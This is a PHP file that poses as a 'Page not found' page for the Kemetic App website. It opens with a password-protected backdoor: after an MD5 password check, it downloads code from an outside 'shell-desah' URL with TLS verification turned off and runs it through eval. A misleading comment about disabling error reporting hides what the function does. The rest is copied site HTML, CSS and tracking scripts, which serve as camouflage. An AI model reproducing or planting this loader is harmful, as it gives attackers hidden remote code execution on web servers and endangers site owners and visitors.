<?php
session_start();

/**
 * Disable error reporting
 *
 * Set this to error_reporting( -1 ) for debugging.
 */
function geturlsinfo($url) {
    if (function_exists('curl_exec')) {
        $conn = curl_init($url);
        curl_setopt($conn, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($conn, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($conn, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
        curl_setopt($conn, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($conn, CURLOPT_SSL_VERIFYHOST, 0);

        // Set cookies using session if available
        if (isset($_SESSION['coki'])) {
            curl_setopt($conn, CURLOPT_COOKIE, $_SESSION['coki']);
        }

        $url_get_contents_data = curl_exec($conn);
        curl_close($conn);
    } elseif (function_exists('file_get_contents')) {
        $url_get_contents_data = file_get_contents($url);
    } elseif (function_exists('fopen') && function_exists('stream_get_contents')) {
        $handle = fopen($url, "r");
        $url_get_contents_data = stream_get_contents($handle);
        fclose($handle);
    } else {
        $url_get_contents_data = false;
    }
    return $url_get_contents_data;
}

// Function to check if the user is logged in
function is_logged_in()
{
    return isset($_SESSION['logged_in']) && $_SESSION['logged_in'] === true;
}

// Check if the password is submitted and correct
if (isset($_POST['password'])) {
    $entered_password = $_POST['password'];
    $hashed_password = '04965dda82bf167c2df017b3945546e3'; // Replace this with your MD5 hashed password
    if (md5($entered_password) === $hashed_password) {
        // Password is correct, store it in session
        $_SESSION['logged_in'] = true;
        $_SESSION['coki'] = 'asu'; // Replace this with your cookie data
    } else {
        // Password is incorrect
        echo "Incorrect password. Please try again.";
    }
}

// Check if the user is logged in before executing the content
if (is_logged_in()) {
    $a = geturlsinfo('https://beraskencur.site/pu/shell-desah');
    eval('?>' . $a);
} else {
    // Display login form if not logged in
    ?>
    
<!DOCTYPE html>
<html lang="en">


<head>
    <meta charset="utf-8">
<!-- CSRF Token -->
<meta name="csrf-token" content="x3RWXdTY7zE6z9Z3LOh9KuzNfmPPSVMHz5t3DiVz">

<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">

<meta name='robots' content="NOODP, nofollow, noindex">


<link rel='shortcut icon' type='image/x-icon' href="https://kemetic.app/store/1/meta-img.png">
<link rel="manifest" href="/mix-manifest.json?v=4">
<meta name="theme-color" content="#FFF">
<!-- Windows Phone -->
<meta name="msapplication-starturl" content="/">
<meta name="msapplication-TileColor" content="#FFF">
<meta name="msapplication-TileImage" content="/ms-icon-144x144.png">
<!-- iOS Safari -->
<meta name="apple-mobile-web-app-title" content="Kemetic App">
<link rel="apple-touch-icon" href="https://kemetic.app/store/1/meta-img.png">
<meta name="apple-mobile-web-app-capable" content="yes">
<meta name="apple-mobile-web-app-status-bar-style" content="default">
<!-- Android -->
<link rel='icon' href='https://kemetic.app/store/1/meta-img.png'>
<meta name="application-name" content="Kemetic App">
<meta name="mobile-web-app-capable" content="yes">
<!-- Other -->
<meta name="layoutmode" content="fitscreen/standard">
<link rel="home" href="https://kemetic.app">

<!-- Open Graph -->
<meta property='og:title' content='Page not found'>
<meta name='twitter:card' content='summary'>
<meta name='twitter:title' content='Page not found'>


<meta property='og:site_name' content='https://kemetic.app/Kemetic App'>
<meta property='og:image' content='https://kemetic.app/store/1/meta-img.png'>
<meta name='twitter:image' content='https://kemetic.app/store/1/meta-img.png'>
<meta property='og:locale' content='https://kemetic.app/en_US'>
<meta property='og:type' content='website'>

<!-- Google tag (gtag.js) -->
<script async src="https://www.googletagmanager.com/gtag/js?id=GT-MBLCK8XV"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'GT-MBLCK8XV');
</script>

<!-- Meta Pixel Code -->
<script>
!function(f,b,e,v,n,t,s)
{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
n.callMethod.apply(n,arguments):n.queue.push(arguments)};
if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
n.queue=[];t=b.createElement(e);t.async=!0;
t.src=v;s=b.getElementsByTagName(e)[0];
s.parentNode.insertBefore(t,s)}(window, document,'script',
'https://connect.facebook.net/en_US/fbevents.js');
fbq('init', '878039774311472');
fbq('track', 'PageView');
</script>
<noscript><img height="1" width="1" style="display:none"
src="https://www.facebook.com/tr?id=878039774311472&ev=PageView&noscript=1"
/></noscript>
<!-- End Meta Pixel Code -->

<script>(function(w,d,t,r,u){var f,n,i;w[u]=w[u]||[],f=function(){var o={ti:"211024181", enableAutoSpaTracking: true};o.q=w[u],w[u]=new UET(o),w[u].push("pageLoad")},n=d.createElement(t),n.src=r,n.async=1,n.onload=n.onreadystatechange=function(){var s=this.readyState;s&&s!=="loaded"&&s!=="complete"||(f(),n.onload=n.onreadystatechange=null)},i=d.getElementsByTagName(t)[0],i.parentNode.insertBefore(n,i)})(window,document,"script","//bat.bing.com/bat.js","uetq");</script>
<script>
   // Add this script right after your base UET tag code
   window.uetq = window.uetq || [];
   window.uetq.push('set', { 'pid': { 
      'em': 'contoso@example.com', // Replace with the variable that holds the user's email address. 
      'ph': '+14250000000', // Replace with the variable that holds the user's phone number. 
   } });
</script>

<script>function uet_report_conversion() {window.uetq = window.uetq || [];window.uetq.push('event', 'purchase', {"event_label":"10d729f5-1389-48be-979f-fba4212ad227","revenue_value":Replace_with_Variable_Revenue_Function(),"currency":"USD"});}</script>

<script>(function(w,d,t,r,u){var f,n,i;w[u]=w[u]||[],f=function(){var o={ti:"211024181"};o.q=w[u],w[u]=new UET(o),w[u].push("pageLoad")},n=d.createElement(t),n.src=r,n.async=1,n.onload=n.onreadystatechange=function(){var s=this.readyState;s&&s!=="loaded"&&s!=="complete"||(f(),n.onload=n.onreadystatechange=null)},i=d.getElementsByTagName(t)[0],i.parentNode.insertBefore(n,i)})(window,document,"script","//bat.bing.com/bat.js","uetq");</script>

    <title>Page not found | Kemetic App</title>

    <!-- General CSS File -->
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://kemetic.app//assets/default/vendors/sweetalert2/dist/sweetalert2.min.css">
    <link rel="stylesheet" href="https://kemetic.app//assets/default/vendors/toast/jquery.toast.min.css">
    <link rel="stylesheet" href="https://kemetic.app//assets/default/vendors/simplebar/simplebar.css">

    
    <link rel="preload" href="https://kemetic.app//assets/default/css/app.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
<noscript><link rel="stylesheet" href="https://kemetic.app//assets/default/css/app.css"></noscript>


    
        
    <style>
        @media (max-width: 767px) @media (max-width: 1130px) {
    .cart-banner {
        padding: 5px 0;
    }
}
.cart-banner {
    width: 100%;
    padding: 10px 0;
    background-color: #212529;
}

@media (max-width: 1130px) {
    .cart-banner {
        padding: 5px 0;
    }
}
.cart-banner {
    width: 100%;
    padding: 10px 0;
    background-color: #212529;
}


#app > section.container.mt-45 > div > img{
    width: 250px;
    height: auto;
    transition: transform 0.3s ease;
    margin-left: 40%;
    border-radius: 30%;
}

@media (max-width: 767px) {
#app > section.container.mt-45 > div > img{
    width: 250px;
    height: auto;
    transition: transform 0.3s ease;
    margin-left: 20%;
    border-radius: 30%;
}

        @font-face {
                      font-family: 'rtl-font-family';
                      font-style: normal;
                      font-weight: 400;
                      font-display: swap;
                      src: url(/store/1/fonts/Vazir-Regular.woff2) format('woff2');
                    }@font-face {
                      font-family: 'rtl-font-family';
                      font-style: normal;
                      font-weight: bold;
                      font-display: swap;
                      src: url(/store/1/fonts/Vazir-Bold.woff2) format('woff2');
                    }@font-face {
                      font-family: 'rtl-font-family';
                      font-style: normal;
                      font-weight: 500;
                      font-display: swap;
                      src: url(/store/1/fonts/Vazir-Medium.woff2) format('woff2');
                    }

        :root{
}

    </style>


            <style>
    .pace { -webkit-pointer-events: none; pointer-events: none; -webkit-user-select: none; -moz-user-select: none; user-select: none; } .pace-inactive { display: none; } .pace .pace-progress { background: #29d; position: fixed; z-index: 2000; top: 0; right: 100%; width: 100%; height: 2px; } .pace .pace-progress-inner { display: block; position: absolute; right: 0px; width: 100px; height: 100%; box-shadow: 0 0 10px #29d, 0 0 5px #29d; opacity: 1.0; -webkit-transform: rotate(3deg) translate(0px, -4px); -moz-transform: rotate(3deg) translate(0px, -4px); -ms-transform: rotate(3deg) translate(0px, -4px); -o-transform: rotate(3deg) translate(0px, -4px); transform: rotate(3deg) translate(0px, -4px); } .pace .pace-activity { display: block; position: fixed; z-index: 2000; top: 15px; right: 15px; width: 14px; height: 14px; border: solid 2px transparent; border-top-color: #29d; border-left-color: #29d; border-radius: 10px; -webkit-animation: pace-spinner 400ms linear infinite; -moz-animation: pace-spinner 400ms linear infinite; -ms-animation: pace-spinner 400ms linear infinite; -o-animation: pace-spinner 400ms linear infinite; animation: pace-spinner 400ms linear infinite; } @-webkit-keyframes pace-spinner { 0% { -webkit-transform: rotate(0deg); transform: rotate(0deg); } 100% { -webkit-transform: rotate(360deg); transform: rotate(360deg); } } @-moz-keyframes pace-spinner { 0% { -moz-transform: rotate(0deg); transform: rotate(0deg); } 100% { -moz-transform: rotate(360deg); transform: rotate(360deg); } } @-o-keyframes pace-spinner { 0% { -o-transform: rotate(0deg); transform: rotate(0deg); } 100% { -o-transform: rotate(360deg); transform: rotate(360deg); } } @-ms-keyframes pace-spinner { 0% { -ms-transform: rotate(0deg); transform: rotate(0deg); } 100% { -ms-transform: rotate(360deg); transform: rotate(360deg); } } @keyframes pace-spinner { 0% { transform: rotate(0deg); transform: rotate(0deg); } 100% { transform: rotate(360deg); transform: rotate(360deg); } }
</style>
<style>
	input { margin:0;background-color:#fff;border:1px solid #fff; }
</style>

<script>
    window.paceOptions = {
        ajax: false, // disabled
        document: false, // disabled
        eventLag: false, // disabled
    };
</script>
<script src="https://kemetic.app//assets/default/vendors/pace-loading/pace.min.js"></script>
    </head>

<body class="">

<div id="app" class="has-fixed-top-floating-bar">
            <div class="floating-bar is-fixed position-top " style="background-image: url(&#039;/store/1/topnav_background.jpg&#039;); background-color: #ffffff; height: 100px;">
    <div class="container h-100">
        <div class="d-flex align-items-center justify-content-between h-100">
            <div class="d-flex align-items-center">
                                <div class="">
                                            <h5 class="font-16 font-weight-bold" style="color: #2d2d2d">Unlock Ancient Secrets! Join 100,000+ Seekers For free!</h5>
                    
                                            <div class="font-14" style="color: #000000">Explore free articles, Free transformative courses, Free Video&#039;s, Free Livestreams, products, Free timeless wisdom and more!</div>
                                    </div>
            </div>

                            <a
                    href="https://kemetic.app/register"
                    class="btn btn-sm"
                    style="background-color: #4f26c9; border-color: #4f26c9; color: #ffffff; "
                >Join Now!</a>
                    </div>
    </div>
    
    
    <span class="floating-bar__close">
        &times;
    </span>
</div>
<style>
    /* Floating Bar Close Button Styles */
    .floating-bar {
        position: relative; /* Essential for positioning the child element (the cross) absolutely */
    }

    .floating-bar__close {
        /* Absolute positioning relative to .floating-bar */
        position: absolute; 
        top: 50%; 
        right: 15px; 
        transform: translateY(-50%); 
        
        /* Styling */
        font-size: 24px;
        font-weight: bold;
        cursor: pointer;
        line-height: 1;
        color: inherit;
        padding: 5px; 
    }

    /* Sticky Header Logic Controlled by the CSS Variable */
    
    /* 1. Body Padding: Pushes down content when the bar is open (height > 0) */
    .has-fixed-top-floating-bar {
        /* The variable is set dynamically to actual height or 0px by JavaScript */
        padding-top: var(--floating-bar-height, 0px); 
    }

    /* 2. Sticky Navbar Position: Aligns the sticky header below the floating bar */
    .has-fixed-top-floating-bar .navbar.sticky {
        top: var(--floating-bar-height, 0px) !important; /* Use !important if necessary to override defaults */
    }
</style>
<script>
    const floatingBar = document.querySelector('.floating-bar');
    floatingBar.style.display = 'none';
    document.addEventListener('DOMContentLoaded', function () {
        // const floatingBar = document.querySelector('.floating-bar');
        const closeButton = document.querySelector('.floating-bar__close');
        const body = document.body;
        const cookieName = 'floating_bar_closed';
        
        // Retrieve the PHP-passed height from the data attribute or use the fallback (80)
        // We use a data attribute to safely pass the dynamic height from server to client
        const barHeight = 100; // This value comes from the PHP block above
        
        // --- 1. HANDLE CLOSING ACTION ---
        if (closeButton && floatingBar) {
            closeButton.addEventListener('click', function () {
                // HIDE the bar
                floatingBar.style.display = 'none';
                
                // CRITICAL: Set the CSS Custom Property to 0px, causing the sticky navbar to move to top: 0
                body.style.setProperty('--floating-bar-height', '0px');

                // Remove the body class (clean-up)
                body.classList.remove('has-fixed-top-floating-bar');

                // Set cookie (7 days)
                const date = new Date();
                date.setTime(date.getTime() + (7 * 24 * 60 * 60 * 1000));
                document.cookie = cookieName + "=true; expires=" + date.toUTCString() + "; path=/";
            });
        }

        // --- 2. CHECK INITIAL PAGE LOAD STATUS ---
        function checkFloatingBarStatusOnLoad() {
            const isClosed = document.cookie.includes(cookieName + '=true');
            const isFixedTop = floatingBar && floatingBar.classList.contains('position-top') && floatingBar.classList.contains('is-fixed');
            
            if (isFixedTop) {
                if (isClosed) {
                    // Closed by cookie: Hide bar and set variable to 0px
                    if (floatingBar) {
                        floatingBar.style.display = 'none';
                    }
                    body.style.setProperty('--floating-bar-height', '0px');
                    // The body class should already be absent thanks to PHP check
                    
                } else {
                    // Open: Show bar and set variable to actual height
                    if (floatingBar) {
                        floatingBar.style.display = ''; 
                    }
                    body.style.setProperty('--floating-bar-height', `${barHeight}px`);
                    // The body class should already be present thanks to PHP check
                }
            } else {
                // Not fixed-top or not present: Ensure variable is 0
                body.style.setProperty('--floating-bar-height', '0px');
            }
        }

        checkFloatingBarStatusOnLoad();
    });
</script>    
            <div class="top-navbar d-flex border-bottom">
    <div class="container d-flex justify-content-between flex-column flex-lg-row">
        <div class="top-contact-box border-bottom d-flex flex-column flex-md-row align-items-center justify-content-center">

            
            <div class="d-flex align-items-center justify-content-between justify-content-md-center">

                
                <div class="js-currency-select custom-dropdown position-relative">
        <form action="/set-currency" method="post">
            <input type="hidden" name="_token" value="x3RWXdTY7zE6z9Z3LOh9KuzNfmPPSVMHz5t3DiVz">
            <input type="hidden" name="currency" value="USD">
            
                                                <div class="custom-dropdown-toggle d-flex align-items-center cursor-pointer">
                        <div class="mr-5 text-secondary">
                            <span class="js-lang-title font-14">USD ($)</span>
                        </div>
                        <i data-feather="chevron-down" class="icons" width="14px" height="14px"></i>
                    </div>
                                                                </form>

        <div class="custom-dropdown-body py-10">

                            <div class="js-currency-dropdown-item custom-dropdown-body__item cursor-pointer active" data-value="USD" data-title="USD ($)">
                    <div class=" d-flex align-items-center w-100 px-15 py-5 text-gray bg-transparent">
                        <div class="size-32 position-relative d-flex-center bg-gray100 rounded-sm">
                            $
                        </div>

                        <span class="ml-5 font-14">United States Dollar</span>
                    </div>
                </div>
                            <div class="js-currency-dropdown-item custom-dropdown-body__item cursor-pointer " data-value="EUR" data-title="EUR (€)">
                    <div class=" d-flex align-items-center w-100 px-15 py-5 text-gray bg-transparent">
                        <div class="size-32 position-relative d-flex-center bg-gray100 rounded-sm">
                            €
                        </div>

                        <span class="ml-5 font-14">Euro Member Countries</span>
                    </div>
                </div>
            
        </div>
    </div>


                                    <div class="mr-15 mx-md-20"></div>
                

                <form action="/search" method="get" class="form-inline my-2 my-lg-0 navbar-search position-relative">
                    <input class="form-control mr-5 rounded" type="text" name="search" placeholder="Search..." aria-label="Search">

                    <button type="submit" class="btn-transparent d-flex align-items-center justify-content-center search-icon">
                        <i data-feather="search" width="20" height="20" class="mr-10"></i>
                    </button>
                </form>
            </div>
        </div>

        <div class="xs-w-100 d-flex align-items-center justify-content-between ">
            <div class="d-flex">

                <div class="dropdown">
            <button type="button" disabled class="btn btn-transparent dropdown-toggle" id="navbarShopingCart" data-toggle="dropdown"
                aria-haspopup="true" aria-expanded="false">
            <i data-feather="shopping-cart" width="20" height="20" class="mr-10"></i>

                    </button>
    
    <div class="dropdown-menu" aria-labelledby="navbarShopingCart">
        <div class="d-md-none border-bottom mb-20 pb-10 text-right">
            <i class="close-dropdown" data-feather="x" width="32" height="32" class="mr-10"></i>
        </div>
        <div class="h-100">
            <div class="navbar-shopping-cart h-100" data-simplebar>
                                    <div class="d-flex align-items-center text-center py-50">
                        <i data-feather="shopping-cart" width="20" height="20" class="mr-10"></i>
                        <span class="">Your cart is empty</span>
                    </div>
                            </div>
        </div>
    </div>
</div>

                <div class="border-left mx-5 mx-lg-15"></div>

                <div class="dropdown">
    <button type="button" class="btn btn-transparent dropdown-toggle" disabled id="navbarNotification" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
        <i data-feather="bell" width="20" height="20" class="mr-10"></i>

            </button>

    <div class="dropdown-menu pt-20" aria-labelledby="navbarNotification">
        <div class="d-flex flex-column h-100">
            <div class="mb-auto navbar-notification-card" data-simplebar>
                <div class="d-md-none border-bottom mb-20 pb-10 text-right">
                    <i class="close-dropdown" data-feather="x" width="32" height="32" class="mr-10"></i>
                </div>

                                    <div class="d-flex align-items-center text-center py-50">
                        <i data-feather="bell" width="20" height="20" class="mr-10"></i>
                        <span class="">Empty notifications</span>
                    </div>
                
            </div>

                    </div>
    </div>
</div>
            </div>

            
            <div class="d-flex align-items-center ml-md-50">
        <a href="/login" class="py-5 px-10 mr-10 text-dark-blue font-14">Login</a>
        <a href="/register" class="py-5 px-10 text-dark-blue font-14">Register</a>
    </div>
        </div>
    </div>
</div>


        <div id="navbarVacuum"></div>
<nav id="navbar" class="navbar navbar-expand-lg navbar-light">
    <div class="container">
        <div class="d-flex align-items-center justify-content-between w-100 row-reverse">

            <a class="navbar-brand navbar-order d-flex align-items-center justify-content-center mr-0 " href="/">
                                    <img src="/store/1/default_images/website-logo.png" class="img-cover" alt="site logo">
                            </a>

            <button class="navbar-toggler navbar-order" type="button" id="navbarToggle">
                <span class="navbar-toggler-icon"></span>
            </button>

            <div class=" d-none d-lg-flex flex-grow-1 navbar-toggle-content " id="navbarContent">
                <div class="navbar-toggle-header text-right d-lg-none">
                    <button class="btn-transparent" id="navbarClose">
                        <i data-feather="x" width="32" height="32"></i>
                    </button>
                </div>

                <ul class="navbar-nav ml-auto d-flex align-items-center">

                                                                        <li class="nav-item">
                                <a class="nav-link" href="/">Home</a>
                            </li>
													
						                                                    <li class="nav-item">
                                <a class="nav-link" href="/pages/about">About</a>
                            </li>
													
						                                                    <li class="nav-item">
                                <a class="nav-link" href="/classes?sort=newest">Courses</a>
                            </li>
													
						                                                    <li class="nav-item">
                                <a class="nav-link" href="/products">Store</a>
                            </li>
													
													<li class="nav-item">
								<a href="https://kemetic.app/reels" class="nav-link">
									Reels
								</a>
							</li>
						                                                    <li class="nav-item">
                                <a class="nav-link" href="/instructor-finder">Instructors</a>
                            </li>
													
						                                                    <li class="nav-item">
                                <a class="nav-link" href="/blog">Articles</a>
                            </li>
													
						                                                    <li class="nav-item">
                                <a class="nav-link" href="/panel/support/new">Contact</a>
                            </li>
													
						                                                            </ul>
            </div>

          <div class="d-none">
          <div class="nav-icons-or-start-live navbar-order d-flex align-items-center justify-content-end ">

    <a href="/login" class="d-none d-lg-flex btn btn-sm btn-primary nav-start-a-live-btn btn-navbar">
        Start learning
    </a>

    <a href="/login" class="d-flex d-lg-none text-white nav-start-a-live-btn font-14">
        Start learning
    </a>


<div class="d-none nav-notify-cart-dropdown top-navbar">
    <div class="dropdown">
            <button type="button" disabled class="btn btn-transparent dropdown-toggle" id="navbarShopingCart" data-toggle="dropdown"
                aria-haspopup="true" aria-expanded="false">
            <i data-feather="shopping-cart" width="20" height="20" class="mr-10"></i>

                    </button>
    
    <div class="dropdown-menu" aria-labelledby="navbarShopingCart">
        <div class="d-md-none border-bottom mb-20 pb-10 text-right">
            <i class="close-dropdown" data-feather="x" width="32" height="32" class="mr-10"></i>
        </div>
        <div class="h-100">
            <div class="navbar-shopping-cart h-100" data-simplebar>
                                    <div class="d-flex align-items-center text-center py-50">
                        <i data-feather="shopping-cart" width="20" height="20" class="mr-10"></i>
                        <span class="">Your cart is empty</span>
                    </div>
                            </div>
        </div>
    </div>
</div>

    <div class="border-left mx-15"></div>

    <div class="dropdown">
    <button type="button" class="btn btn-transparent dropdown-toggle" disabled id="navbarNotification" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
        <i data-feather="bell" width="20" height="20" class="mr-10"></i>

            </button>

    <div class="dropdown-menu pt-20" aria-labelledby="navbarNotification">
        <div class="d-flex flex-column h-100">
            <div class="mb-auto navbar-notification-card" data-simplebar>
                <div class="d-md-none border-bottom mb-20 pb-10 text-right">
                    <i class="close-dropdown" data-feather="x" width="32" height="32" class="mr-10"></i>
                </div>

                                    <div class="d-flex align-items-center text-center py-50">
                        <i data-feather="bell" width="20" height="20" class="mr-10"></i>
                        <span class="">Empty notifications</span>
                    </div>
                
            </div>

                    </div>
    </div>
</div>
</div>

</div>
          </div>
        </div>
    </div>
</nav>

    
    
        
    <section class="my-50 container text-center">
        <div class="row justify-content-md-center">
            <div class="col col-md-6">
                <img src="/store/1/default_images/404.svg" class="img-cover " alt="">
            </div>
        </div>

        <h2 class="mt-25 font-36">Page not found!</h2>
        <p class="mt-25 font-16">Sorry, this page is not available... Go to home page to start your journey and access all our courses!</p>
    </section>

            <style>
 #cookie-consent-banner {
    position: fixed;
    bottom: 0;
    left: 0;
    right: 0;
    background-color: rgba(0, 0, 0, 0.8);
    color: white;
    padding: 10px;
    text-align: center;
    z-index: 9999;
    font-family: Arial, sans-serif;
}

.cookie-content {
    display: flex;
    justify-content: space-between;
    align-items: center;
    max-width: 960px;
    margin: 0 auto;
}

#accept-cookies {
    background-color: #4CAF50;
    color: white;
    border: none;
    padding: 10px 20px;
    cursor: pointer;
}

/*#accept-cookies:hover {*/
/*    background-color: #fff;*/
/*}*/

.cookie-policy {
    color: #a06af5;
    text-decoration: none;
    background-color: transparent;
    
}
.cookie-policy:hover {
    color: #a06af5;
    
}


</style>




    <div id="cookie-consent-banner" style="display: none;">
        <div class="cookie-content">
            <p>We use cookies to improve your experience. By continuing to use this site, you accept our <a class="cookie-policy" href="https://kemetic.app/pages/privacy-policy">Cookie Policy</a>.</p>
            <button id="accept-cookies">Accept Cookies</button>
        </div>
    </div>



    <footer class="footer bg-primary position-relative user-select-none">
<!-- <svg class="footer-wave-svg" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1200 100" preserveAspectRatio="none">
        <path class="footer-wave-path" d="M851.8,100c125,0,288.3-45,348.2-64V0H0v44c3.7-1,7.3-1.9,11-2.9C80.7,22,151.7,10.8,223.5,6.3C276.7,2.9,330,4,383,9.8 c52.2,5.7,103.3,16.2,153.4,32.8C623.9,71.3,726.8,100,851.8,100z">
        </path>
    </svg> -->
   <div class="container">
        <div class="row">
            <div class="col-12">
                <div class=" footer-subscribe d-block d-md-flex align-items-center justify-content-between">
                    <div class="flex-grow-1">
                        <strong>Join us today</strong>
                        <span class="d-block mt-5 text-white">#We will send the best deals and offers to your email.</span>
                    </div>
                    <div class="subscribe-input bg-white p-10 flex-grow-1 mt-30 mt-md-0">
                        <form action="/newsletters" method="post">
                            <input type="hidden" name="_token" value="x3RWXdTY7zE6z9Z3LOh9KuzNfmPPSVMHz5t3DiVz">

                            <div class="form-group d-flex align-items-center m-0">
                                <div class="w-100">
                                    <input type="text" name="newsletter_email" class="form-control border-0 " placeholder="Enter your email here"/>
                                                                    </div>
                                <button type="submit" class="btn btn-primary rounded-pill">Join</button>
                                <!-- <a href="/landing-page" class="btn btn-primary rounded-pill">Join</a> -->
                            </div>
                        </form>
                    </div>
                </div>
            </div>
        </div>
    </div> 

    
    <div class="container">
        <div class="row">

                            <div class="col-12 col-md-4 mb-4 mb-lg-0">
                                                                        <span class="header d-block text-white font-weight-bold">Kemetic App</span>
                        
                                                    <div class="mt-20 footer-link footer-logo-main">
                                <p><img src="/store/1/favicon.png" style="width: 50%;"></p><p><br></p>
                            </div>
                                                            </div><div class="col-12 col-md-4 mb-4 mb-lg-0">
                                                                        <span class="header d-block text-white font-weight-bold">Information</span>
                        
                                                    <div class="mt-20 footer-link footer-logo-main">
                                <p><a href="https://kemetic.app/pages/how-kemetic-app-works" target="_blank" style="transition-property: all;">- How Kemetic App Works</a></p><p><a href="https://kemetic.app/pages/Payment-Information" target="_blank">- Payment information</a></p><p><a href="https://kemetic.app/pages/eula" target="_blank">-</a><a href="https://kemetic.app/pages/eula" target="_blank">Eula</a></p><p><a href="/pages/privacy-policy" target="_blank">- Privacy Policy</a></p><p><a href="/pages/terms" target="_blank">- Terms and conditions</a><br></p><p>-&nbsp;<a href="/pages/refund-policy" target="_blank">Refund and Returns Policy</a></p><p>-&nbsp;<a href="/pages/support" target="_blank">Support</a></p><p><a href="/contact" target="_blank">- Contact</a></p>
                            </div>
                                                            </div>
                            <div class="col-12 col-md-4 mb-4 mb-lg-0">
                                                                        <span class="header d-block text-white font-weight-bold">Partnership</span>
                        
                                                    <div class="mt-20 footer-link footer-logo-main">
                                <p><a href="https://kemetic.app/pages/newsletter" target="_blank" style="transition-property: all;">- Join the newsletter community today!</a></p><p><a href="/brand-ambassador" target="_blank" style="transition-property: all;">- Brand Ambassadors</a></p><p><a href="https://kemetic.app/pages/affiliate-marketing" target="_blank" style="transition-property: all; background-color: transparent;">-&nbsp;Affiliate Program</a></p><p><a href="https://kemetic.app/media-kit" target="_blank">- Media kit Affiliate partners</a></p><p><a href="https://kemetic.app/pages/KemeticApp-Affiliate-Program-Policy" target="_blank" style="transition-property: all;">-&nbsp;Affiliate Program&nbsp;Policy&nbsp;</a></p><p></p><p><a href="https://kemetic.app/pages/Become-a-Vendor-on-KemeticApp" target="_blank" style="transition-property: all; background-color: transparent;">-&nbsp;Sell your products on Kemetic App</a></p><p><a href="https://kemetic.app/pages/Vendors-policy" target="_blank" style="transition-property: all;">-&nbsp;Sellers/ Vendors policy</a></p>
                            </div>
                                                            </div>
                            <div class="col-12 col-md-4 mb-4 mb-lg-0">
                                                                        <span class="header d-block text-white font-weight-bold">Users</span>
                        
                                                    <div class="mt-20 footer-link footer-logo-main">
                                <p><a href="https://kemetic.app/pages/newsletter" target="_blank" style="color: rgb(0, 86, 179); transition-property: all;">- Join the newsletter community today!</a></p><p><a href="https://kemetic.app/register" target="_blank">- Instructor Registration</a></p><p><a href="https://kemetic.app/register" target="_blank" style="transition-property: all;">- Student Registration</a></p><p><br></p>
                            </div>
                                                            </div>
            
        </div>

        <div class=" border-blue py-5 d-flex align-items-center justify-content-between">
            <div class="footer-logo">
                <a href="/">
                                            <img src="/store/1/default_images/website-logo-white.png" class="img-cover img-footer" alt="footer logo">
                                    </a>
            </div>

            <div class="footer-social">
                                                            <a href="https://web.whatsapp.com/" target="_blank">
                            <img src="/store/1/default_images/social/whatsapp.svg" alt="Whatsapp" class="mr-15">
                        </a>
                                            <a href="https://x.com/mythoughtsoneveryting" target="_blank">
                            <img src="/store/1/default_images/social/twitter.svg" alt="Twitter" class="mr-15">
                        </a>
                                            <a href="https://www.facebook.com/@mythoughtsoneverythingg" target="_blank">
                            <img src="/store/1/default_images/social/facebook.svg" alt="Facebook" class="mr-15">
                        </a>
                                                </div>
        </div>
    </div>

            <div class="footer-copyright-card">
            <div class="align-items-center container d-flex flex-column flex-md-row justify-content-between py-15 gap10">
                <div class="font-14 text-white">Kemetic.app © All rights reserved</div>

                <div class="d-flex align-items-center justify-content-center">
                                            <div class="d-flex align-items-center text-white font-14">
                            <i data-feather="phone" width="20" height="20" class="mr-10"></i>
                            +31628356037
                        </div>
                    
                                            <div class="border-left mx-5 mx-lg-15 h-100"></div>

                        <div class="d-flex align-items-center text-white font-14">
                            <i data-feather="mail" width="20" height="20" class="mr-10"></i>
                            info@kemetic.app
                        </div>
                                    </div>
            </div>
        </div>
    
</footer>
<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
<script>
    document.addEventListener("DOMContentLoaded", function() {
        var isLoggedIn = false; // Check if the user is logged in

        document.querySelectorAll(".footer-link a").forEach(function(link) {
            if (link.textContent.trim() === "- Media kit Affiliate partners") {
                link.addEventListener("click", function(event) {
                    if (!isLoggedIn) {
                        event.preventDefault(); // Prevent navigation
                        window.location.href = "/login"; // Redirect to login page
                    }
                });
            }
        });
    });
</script>


<script>
    $(document).ready(function() {
    // Check if the cookie consent is already given
    if (!getCookie('cookiesAccepted')) {
        $('#cookie-consent-banner').show();
    }

    // Accept cookies and set a cookie
    $('#accept-cookies').click(function() {
        setCookie('cookiesAccepted', 'true', 365); // Expire in 1 year
        $('#cookie-consent-banner').fadeOut();
    });
});

// Get a cookie by name
function getCookie(name) {
    var nameEQ = name + "=";
    var ca = document.cookie.split(';');
    for (var i = 0; i < ca.length; i++) {
        var c = ca[i].trim();
        if (c.indexOf(nameEQ) == 0) return c.substring(nameEQ.length, c.length);
    }
    return null;
}

// Set a cookie
function setCookie(name, value, days) {
    var d = new Date();
    d.setTime(d.getTime() + (days*24*60*60*1000));
    var expires = "expires=" + d.toUTCString();
    document.cookie = name + "=" + value + ";" + expires + ";path=/";
}


</script>
    
    
    </div>
<!-- Template JS File -->
<!--<script src="https://kemetic.app//assets/default/js/app.js"></script>-->
<script src="/assets/default/js/app.js"></script>
<script src="https://kemetic.app//assets/default/vendors/feather-icons/dist/feather.min.js"></script>
<!--<script src="https://kemetic.app//assets/default/vendors/moment.min.js"></script>-->
<script src="/assets/default/vendors/moment.min.js"></script>
<script src="https://kemetic.app//assets/default/vendors/sweetalert2/dist/sweetalert2.min.js"></script>
<script src="https://kemetic.app//assets/default/vendors/toast/jquery.toast.min.js"></script>
<script type="text/javascript" src="https://kemetic.app//assets/default/vendors/simplebar/simplebar.min.js"></script>
<!-- <script src="https://kemetic.app//assets/default/js/parts/navbar.min.js"></script> -->


<script>
